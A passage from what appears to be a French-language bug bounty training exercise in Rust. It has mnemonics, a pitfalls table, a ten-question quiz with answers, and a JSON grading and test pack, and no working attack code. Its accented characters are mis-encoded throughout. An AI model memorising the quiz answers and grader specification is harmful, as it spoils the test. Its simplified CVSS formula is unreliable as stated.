‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   5   ‚îÇ TRAITER TC3 (cors_analysis)        ‚îÇ                 ‚îÇ                                ‚îÇ
‚îÇ  5.1  ‚îÇ ‚îú‚îÄ is_out_of_scope("/api/user")?   ‚îÇ false           ‚îÇ Endpoint in-scope              ‚îÇ
‚îÇ  5.2  ‚îÇ ‚îú‚îÄ analyze_cors(TC3)               ‚îÇ                 ‚îÇ reflect + credentials          ‚îÇ
‚îÇ  5.3  ‚îÇ ‚îú‚îÄ CR√âER Finding HIGH              ‚îÇ cvss = 7.5      ‚îÇ CORS misconfig d√©tect√©e        ‚îÇ
‚îÇ  5.4  ‚îÇ ‚îî‚îÄ AJOUTER aux findings            ‚îÇ len = 2         ‚îÇ Deuxi√®me finding ajout√©        ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   6   ‚îÇ TRIER findings par CVSS desc       ‚îÇ [9.8, 7.5]      ‚îÇ CRITICAL en premier            ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   7   ‚îÇ detect_chains(findings)            ‚îÇ chains = [...]  ‚îÇ Pas de chain d√©tect√©e ici      ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   8   ‚îÇ calculate_bounty(findings)         ‚îÇ $13,500         ‚îÇ CRIT($10k) + HIGH($3.5k)       ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   9   ‚îÇ G√âN√âRER rapport et RETOURNER       ‚îÇ JSON output     ‚îÇ 2 findings, $13.5k bounty      ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### 5.8 Mn√©motechniques

#### üé¨ MEME : "Hack the Planet!" ‚Äî Hackers (1995)

Dans le film *Hackers*, Dade Murphy (Zero Cool) et ses amis r√©p√®tent "Hack the Planet!" comme cri de ralliement. En bug bounty, c'est pareil : **scope first, hack second**.

```rust
// üåç "HACK THE PLANET... mais v√©rifie le scope d'abord!"
fn hack_the_planet(target: &str, scope: &Scope) -> Result<Finding, &str> {
    if !scope.includes(target) {
        return Err("Out of scope! Don't be like that script kiddie in the movie.");
    }
    // Now you can hack
    analyze_target(target)
}
```

#### üé≠ MEME : "I am the one who knocks" ‚Äî Breaking Bad

Walter White √©tait m√©thodique dans son approche. Un bon bug bounty hunter aussi :

```
"I am not in danger. I AM the danger."
‚Üí Le bug bounty hunter ne subit pas les vulns, il les TROUVE.

M√©thodologie Walter White :
1. Reconnaissance (Blue Sky = Clear Intel)
2. Pr√©paration (Lab = Environment Setup)
3. Ex√©cution (Cook = Exploit Development)
4. Distribution (Dealing = Report Submission)
```

#### ü¶∏ MEME : "With great power comes great responsibility" ‚Äî Spider-Man

Les vuln√©rabilit√©s critiques sont un pouvoir. La **responsible disclosure** est la responsabilit√© :

```rust
fn responsible_disclosure(finding: Finding) -> Report {
    // üï∑Ô∏è Uncle Ben's Rule
    assert!(finding.is_in_scope, "With great power comes great responsibility");
    assert!(!finding.is_destructive, "We test, we don't destroy");

    Report {
        title: finding.title,
        steps: finding.reproduction_steps,
        impact: finding.impact,
        remediation: suggest_fix(&finding), // Always help fix!
    }
}
```

#### üéÆ MEME : "It's dangerous to go alone! Take this." ‚Äî Zelda

La bo√Æte √† outils du bug bounty hunter :

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  OLD MAN: "It's dangerous to go alone!      ‚îÇ
‚îÇ            Take this."                       ‚îÇ
‚îÇ                                             ‚îÇ
‚îÇ  üó°Ô∏è Burp Suite    - Your Master Sword       ‚îÇ
‚îÇ  üõ°Ô∏è Scope Check   - Your Shield             ‚îÇ
‚îÇ  üí£ Nuclei        - Your Bombs              ‚îÇ
‚îÇ  üèπ FFUF          - Your Bow                ‚îÇ
‚îÇ  üîë JWT Toolkit   - Your Keys               ‚îÇ
‚îÇ  üìú Report Template - Your Map              ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### 5.9 Applications pratiques

| Sc√©nario | Application | R√©sultat |
|----------|-------------|----------|
| **E-commerce audit** | Trouver IDOR sur les commandes | $5,000 bounty |
| **Banking app** | D√©tecter auth bypass | $50,000 bounty |
| **Social media** | XSS stored dans les posts | $10,000 bounty |
| **Cloud provider** | SSRF vers metadata | $100,000 bounty |
| **Healthcare** | SQLi sur donn√©es patients | $25,000 bounty + CVE |

---

## ‚ö†Ô∏è SECTION 6 : PI√àGES ‚Äî R√âCAPITULATIF

| # | Pi√®ge | Description | Cons√©quence | Solution |
|---|-------|-------------|-------------|----------|
| 1 | **Out-of-Scope** | Tester des cibles hors scope | Rapport rejet√©, ban possible | Toujours v√©rifier le scope avant test |
| 2 | **Duplicates** | Soumettre la m√™me vuln deux fois | Temps perdu, r√©putation | Hash unique par finding |
| 3 | **CVSS gonfl√©** | Sur√©valuer la s√©v√©rit√© | Perte de cr√©dibilit√© | Calcul objectif selon CVSS v3.1 |
| 4 | **Rapport minimal** | Juste "XSS found" | Bounty minimal, triage lent | Rapport d√©taill√© avec PoC |
| 5 | **Pas de PoC** | Pas de preuve d'exploitation | Contestation possible | Screenshots, videos, code |
| 6 | **Destructif** | Supprimer des donn√©es en prod | Ban d√©finitif, poursuites | Environnements de test uniquement |
| 7 | **Divulgation pr√©coce** | Publier avant fix | Violation des r√®gles | Attendre le feu vert du programme |
| 8 | **Scope dynamique** | Ne pas rev√©rifier le scope | Targets devenues OOS | V√©rifier le scope r√©guli√®rement |
| 9 | **Mauvais chaining** | Cha√Æner des vulns ind√©pendantes | Rapport confus | Cha√Æner uniquement si li√© logiquement |
| 10 | **Ignorer les low** | Ne chercher que les criticals | Manquer des chains | Les low peuvent devenir critical cha√Æn√©s |

---

## üìù SECTION 7 : QCM

### Question 1
**Qu'est-ce qui rend une vuln√©rabilit√© SAML "CRITICAL" dans un programme bug bounty ?**

A) Le serveur utilise SAML 2.0
B) La signature de l'assertion n'est pas valid√©e, permettant la forge de claims
C) Le certificat SAML est auto-sign√©
D) Le binding HTTP-POST est utilis√©
E) Le NameID est un email
F) L'assertion a une dur√©e de validit√© longue
G) Le metadata est expos√© publiquement
H) Le SP supporte plusieurs IdP
I) Le logout n'est pas impl√©ment√©
J) L'assertion n'est pas chiffr√©e

**R√©ponse : B**
*Explication : Sans validation de signature, un attaquant peut modifier les claims (email, role) et prendre le contr√¥le de n'importe quel compte.*

---

### Question 2
**Comment g√©rer correctement une cible out-of-scope dans un bug bounty ?**

A) La tester quand m√™me mais ne pas reporter
B) La tester et reporter si critique
C) Ne jamais la tester et l'ignorer compl√®tement
D) La tester avec pr√©caution
E) La reporter comme "informatif"
F) Demander une exception au programme
G) La tester en mode passif uniquement
H) La tester si aucune autre cible n'est vuln√©rable
I) La tester et anonymiser le rapport
J) Tester uniquement les sous-domaines

**R√©ponse : C**
*Explication : Les targets out-of-scope ne doivent JAMAIS √™tre test√©es. Violer le scope peut entra√Æner un ban du programme et potentiellement des poursuites l√©gales.*

---

### Question 3
**Quel est le CVSS v3.1 typique pour Log4Shell (CVE-2021-44228) ?**

A) 5.0 (MEDIUM)
B) 7.5 (HIGH)
C) 8.8 (HIGH)
D) 9.0 (CRITICAL)
E) 9.8 (CRITICAL)
F) 10.0 (CRITICAL)
G) 6.5 (MEDIUM)
H) 4.3 (MEDIUM)
I) 3.1 (LOW)
J) Variable selon le contexte

**R√©ponse : F**
*Explication : Log4Shell a un CVSS de 10.0 car il permet l'ex√©cution de code arbitraire √† distance (RCE) sans authentification, avec un impact sur la confidentialit√©, l'int√©grit√© et la disponibilit√©.*

---

### Question 4
**Qu'est-ce qu'un "vulnerability chain" dans le contexte du bug bounty ?**

A) Une liste de CVEs li√©es
B) Une s√©quence de vuln√©rabilit√©s combin√©es pour un impact plus grand
C) Une cha√Æne de caract√®res contenant un payload
D) Un outil de d√©tection automatique
E) Un type de rapport
F) Une technique de bypass WAF
G) Un mode de divulgation
H) Une m√©thode de calcul de bounty
I) Un syst√®me de scoring
J) Un template de rapport

**R√©ponse : B**
*Explication : Le chaining consiste √† combiner plusieurs vuln√©rabilit√©s (ex: Info Disclosure + IDOR + Password Reset) pour atteindre un impact plus √©lev√© qu'individuellement.*

---

### Question 5
**Quelle est la meilleure pratique pour √©viter les rapports en duplicate ?**

A) Toujours √™tre le premier √† soumettre
B) Ne tester que les nouvelles fonctionnalit√©s
C) G√©n√©rer un hash unique bas√© sur le titre et l'endpoint
D) √âviter les vuln√©rabilit√©s communes
E) Utiliser des payloads uniques
F) Tester √† des heures sp√©cifiques
G) Se sp√©cialiser dans un type de vuln
H) √âviter les programmes populaires
I) Soumettre plusieurs variantes
J) Demander au triager avant de soumettre

**R√©ponse : C**
*Explication : Cr√©er un hash unique (title + endpoint + type) permet de d√©tecter programmatiquement les duplicates avant soumission et d'√©viter de perdre du temps.*

---

### Question 6
**Quelle configuration CORS est vuln√©rable au vol de credentials ?**

A) Access-Control-Allow-Origin: https://trusted.com
B) Access-Control-Allow-Origin: * avec Allow-Credentials: false
C) Access-Control-Allow-Origin: reflect avec Allow-Credentials: true
D) Access-Control-Allow-Origin: null
E) Pas de headers CORS
F) Access-Control-Allow-Methods: GET
G) Access-Control-Max-Age: 86400
H) Access-Control-Expose-Headers: X-Custom
I) Access-Control-Allow-Headers: Content-Type
J) Toutes les configurations ci-dessus

**R√©ponse : C**
*Explication : Quand l'Origin est refl√©t√©e ET que les credentials sont autoris√©s, n'importe quel site peut faire des requ√™tes authentifi√©es et lire les r√©ponses.*

---

### Question 7
**Qu'est-ce qui diff√©rencie un rapport "INFORMATIVE" d'un rapport valide ?**

A) Le nombre de mots dans le rapport
B) L'absence d'impact exploitable d√©montr√©
C) Le type de vuln√©rabilit√©
D) La m√©thode de d√©couverte
E) L'anciennet√© de la vuln
F) Le niveau du hunter
G) La plateforme utilis√©e
H) Le format du rapport
I) La pr√©sence de screenshots
J) Le temps de soumission

**R√©ponse : B**
*Explication : Un rapport INFORMATIVE ne d√©montre pas d'impact exploitable r√©el. Par exemple, une version outdated sans exploit connu, ou une "vuln√©rabilit√©" qui ne peut pas √™tre exploit√©e dans le contexte.*

---

### Question 8
**Comment calculer correctement l'estimation de bounty pour plusieurs findings ?**

A) Additionner les bounties maximum de chaque s√©v√©rit√©
B) Prendre le bounty du finding le plus critique
C) Moyenne des bounties
D) Somme des midpoints des ranges par s√©v√©rit√©, excluant les duplicates
E) Maximum possible du programme
F) Minimum garanti
G) Bounty fixe par finding
H) N√©gociation au cas par cas
I) Pourcentage du bounty max
J) Formule propri√©taire du programme

**R√©ponse : D**
*Explication : Pour une estimation r√©aliste, on utilise le midpoint de chaque range de s√©v√©rit√© et on exclut les duplicates qui ne seront pas pay√©s.*

---

### Question 9
**Quel √©l√©ment est OBLIGATOIRE dans un rapport bug bounty professionnel ?**

A) Code d'exploitation complet
B) Vid√©o de d√©monstration
C) Steps de reproduction clairs et d√©taill√©s
D) Analyse du code source
E) Timeline de d√©couverte
F) Liste des outils utilis√©s
G) CV du researcher
H) Historique des rapports pr√©c√©dents
I) R√©f√©rences acad√©miques
J) Comparaison avec d'autres programmes

**R√©ponse : C**
*Explication : Les steps de reproduction sont le minimum absolu. Sans eux, le triager ne peut pas v√©rifier la vuln√©rabilit√© et le rapport sera ferm√© comme "Need More Info".*

---

### Question 10
**Quelle approche est recommand√©e pour maximiser les bounties ?**

A) Soumettre le plus de rapports possible
B) Se concentrer uniquement sur les CRITICAL
C) Chercher des vuln√©rabilit√©s chainables et d√©montrer l'impact maximal
D) Utiliser uniquement des outils automatis√©s
E) Copier les rapports publics
F) Tester 24/7 sans pause
G) Ignorer les programmes avec bounties faibles
H) √âviter les grandes entreprises
I) Se sp√©cialiser dans une seule vuln
J) Tester uniquement les nouvelles features

**R√©ponse : C**
*Explication : Le chaining transforme des vulns LOW/MEDIUM en CRITICAL avec un impact d√©montr√©, ce qui maximise les bounties. La qualit√© prime sur la quantit√©.*

---

## üìä SECTION 8 : R√âCAPITULATIF

### 8.1 Comp√©tences Acquises

| Comp√©tence | Niveau | Application |
|------------|--------|-------------|
| SAML Security | Expert | D√©tecter signature bypass, claim manipulation |
| CORS Analysis | Expert | Identifier misconfigurations exploitables |
| Log Injection | Expert | Log4Shell et d√©riv√©s |
| WebSocket Security | Avanc√© | XSS via WebSocket, protocol issues |
| MFA Bypass | Avanc√© | Race conditions, backup code weaknesses |
| Password Reset | Avanc√© | Host header injection, token prediction |
| Vulnerability Chaining | Expert | Combiner pour impact maximal |
| CVSS Calculation | Expert | Scoring pr√©cis selon v3.1 |
| Professional Reporting | Expert | Rapports accept√©s par programmes majeurs |
| Scope Management | Expert | Respect strict du p√©rim√®tre |

### 8.2 Formules Cl√©s

```
CVSS_Base = Impact √ó Exploitability √ó Scope

Bounty_Estimate = Œ£(midpoint(severity_range)) - duplicates

Chain_Impact = max(individual_impacts) + chain_bonus

Duplicate_Hash = SHA256(title + endpoint + vuln_type)

Time_Allocation = Recon(20%) + Mapping(15%) + Testing(40%) + Exploit(15%) + Report(10%)
```

### 8.3 Checklist Bug Bounty

```
‚ñ° Scope v√©rifi√© avant tout test
‚ñ° Reconnaissance compl√®te
‚ñ° Endpoints mapp√©s
‚ñ° Vuln√©rabilit√©s identifi√©es
‚ñ° CVSS calcul√© correctement
‚ñ° Chaines d√©tect√©es
‚ñ° Duplicates exclus
‚ñ° PoC fonctionnel
‚ñ° Rapport professionnel
‚ñ° Impact d√©montr√©
‚ñ° Remediation sugg√©r√©e
‚ñ° Screenshots/vid√©os inclus
```

---

## üì¶ SECTION 9 : DEPLOYMENT PACK (JSON COMPLET)

```json
{
  "deploy": {
    "hackbrain_version": "5.5.2",
    "engine_version": "v22.1",
    "exercise_slug": "3.3.14-a-bug_bounty_simulation",
    "generated_at": "2025-01-11 12:00:00",

    "metadata": {
      "exercise_id": "3.3.14-a",
      "exercise_name": "bug_bounty_simulation",
      "module": "3.3",
      "module_name": "S√©curit√© Web & Applications",
      "concept": "a",
      "concept_name": "Bug Bounty Simulation Compl√®te",
      "type": "complet_2",
      "tier": 3,
      "tier_info": "Synth√®se (tous concepts du module)",
      "phase": 3,
      "difficulty": 18,
      "difficulty_display": "üß†üß†",
      "language": "rust",
      "language_version": "Edition 2024",
      "duration_minutes": 480,
      "xp_base": 2500,
      "xp_bonus_multiplier": 10,
      "bonus_tier": "IMPOSSIBLE",
      "bonus_icon": "‚ò†Ô∏è",
      "complexity_time": "T8 O(n √ó m √ó k)",
      "complexity_space": "S6 O(n¬≤)",
      "prerequisites": [
        "3.3.1-a √† 3.3.13-a (tous les exercices pr√©c√©dents)"
      ],
      "domains": ["Net", "Crypto", "Struct", "DP"],
      "domains_bonus": ["Probas", "DP", "Crypto"],
      "tags": [
        "bug-bounty",
        "saml",
        "cors",
        "log4shell",
        "websocket",
        "mfa-bypass",
        "password-reset",
        "chaining",
        "cvss",
        "professional-reporting",
        "phase3",
        "synthesis"
      ],
      "vulnerabilities_covered": [
        "CWE-347 (SAML Signature)",
        "CWE-942 (CORS)",
        "CWE-502 (Log4Shell)",
        "CWE-79 (XSS)",
        "CWE-362 (Race Condition)",
        "CWE-640 (Password Reset)",
        "CWE-113 (CRLF)",
        "CWE-89 (SQLi)",
        "CWE-215 (Info Disclosure)",
        "CWE-119 (Memory)"
      ],
      "meme_references": [
        "Hackers (1995) - Hack the Planet!",
        "Breaking Bad - I am the one who knocks",
        "Spider-Man - Great power, great responsibility",
        "Zelda - It's dangerous to go alone"
      ]
    },

    "files": {
      "spec.json": "/* Voir section 4.9 */",
      "references/ref_bug_bounty_simulation.rs": "/* Voir section 4.3 */",
      "references/ref_bug_bounty_simulation_ml.rs": "/* Voir section 4.6 */",
      "alternatives/alt_pattern_matching.rs": "/* Voir section 4.4 */",
      "alternatives/alt_builder_pattern.rs": "/* Voir section 4.4 */",
      "mutants/mutant_a_boundary_cvss.rs": "/* Section 4.10 - CVSS off-by-one */",
      "mutants/mutant_b_safety_no_check.rs": "/* Section 4.10 - No JSON validation */",
      "mutants/mutant_c_resource_leak.rs": "/* Section 4.10 - Double add */",
      "mutants/mutant_d_logic_inverted.rs": "/* Section 4.10 - Scope inversion */",
      "mutants/mutant_e_return_empty.rs": "/* Section 4.10 - Always empty */",
      "mutants/mutant_f_edge_wildcard.rs": "/* Section 4.10 - No wildcard support */",
      "tests/main.rs": "/* Voir section 4.2 */"
    },

    "validation": {
      "expected_pass": [
        "references/ref_bug_bounty_simulation.rs",
        "references/ref_bug_bounty_simulation_ml.rs",
        "alternatives/alt_pattern_matching.rs",
        "alternatives/alt_builder_pattern.rs"
      ],
      "expected_fail": [
        "mutants/mutant_a_boundary_cvss.rs",
        "mutants/mutant_b_safety_no_check.rs",
        "mutants/mutant_c_resource_leak.rs",
        "mutants/mutant_d_logic_inverted.rs",
        "mutants/mutant_e_return_empty.rs",
        "mutants/mutant_f_edge_wildcard.rs"
      ]
    },

    "test_scenarios": {
      "saml_bypass": {
        "input": {"test_type": "saml_analysis", "signature_validated": false},
        "expected_severity": "CRITICAL",
        "expected_cvss_min": 9.0
      },
      "cors_misconfig": {
        "input": {"test_type": "cors_analysis", "allow_origin": "reflect", "allow_credentials": true},
        "expected_severity": "HIGH",
        "expected_cvss_range": [7.0, 8.0]
      },
      "log4shell": {
        "input": {"test_type": "log_injection", "log4j_version": "2.14.1", "jndi_reachable": true},
        "expected_severity": "CRITICAL",
        "expected_cvss": 10.0
      },
      "out_of_scope": {
        "input": {"endpoint": "blog.target.com", "out_of_scope": ["blog.target.com"]},
        "expected_findings_count": 0
      },
      "duplicate": {
        "input": {"same_vuln_twice": true},
        "expected_duplicate_marked": true
      }
    },

    "scoring": {
      "base_points": 2500,
      "bonus_multiplier": 10,
      "max_bonus_points": 25000,
      "penalty_wrong_scope": -500,
      "penalty_wrong_cvss": -100,
      "penalty_missed_chain": -200,
      "bonus_perfect_report": 500
    },

    "commands": {
      "validate_spec": "python3 hackbrain_engine_v22.py --validate-spec spec.json",
      "test_reference": "cargo test --release",
      "test_mutants": "python3 hackbrain_mutation_tester.py -r references/ref_bug_bounty_simulation.rs -s spec.json --validate",
      "run_fuzzing": "cargo fuzz run bug_bounty_fuzzer -- -max_total_time=300",
      "benchmark": "cargo bench"
    },

    "dependencies": {
      "rust_edition": "2024",
      "crates": [
        {"name": "serde", "version": "1.0"},
        {"name": "serde_json", "version": "1.0"},
        {"name": "regex", "version": "1.10"},
        {"name": "url", "version": "2.5"},
        {"name": "chrono", "version": "0.4"}
      ]
    },

    "learning_outcomes": [
      "Comprendre la m√©thodologie bug bounty compl√®te",
      "Ma√Ætriser 18 types de vuln√©rabilit√©s web",
      "Calculer correctement les scores CVSS v3.1",
      "Identifier et exploiter les vulnerability chains",
      "R√©diger des rapports professionnels",
      "Respecter strictement le scope",
      "G√©rer les duplicates efficacement",
      "Estimer les bounties de mani√®re r√©aliste"
    ],

    "real_world_applications": [
      "Participation aux programmes HackerOne/Bugcrowd",
      "Audits de s√©curit√© professionnels",
      "Red team engagements",
      "Security research et CVE discovery",
      "Consulting en s√©curit√© applicative"
    ]
  }
}
```

---

## üèÜ CONCLUSION

Cet exercice de synth√®se repr√©sente le **capstone** du Module 3.3 ‚Äî S√©curit√© Web & Applications. En le compl√©tant, tu as d√©montr√© :

1. **Ma√Ætrise technique** : 18 types de vuln√©rabilit√©s web
2. **M√©thodologie** : Approche structur√©e du bug bounty
3. **Professionnalisme** : Rapports de qualit√© production
4. **√âthique** : Respect du scope et responsible disclosure

**"Hack the Planet!"** ‚Äî mais toujours dans les r√®gles.

---

*HACKBRAIN v5.5.2 ‚Äî Bug Bounty Simulation*
*"L'excellence p√©dagogique ne se n√©gocie pas ‚Äî pas de raccourcis"*
*Compatible ENGINE v22.1 + Mutation Tester*
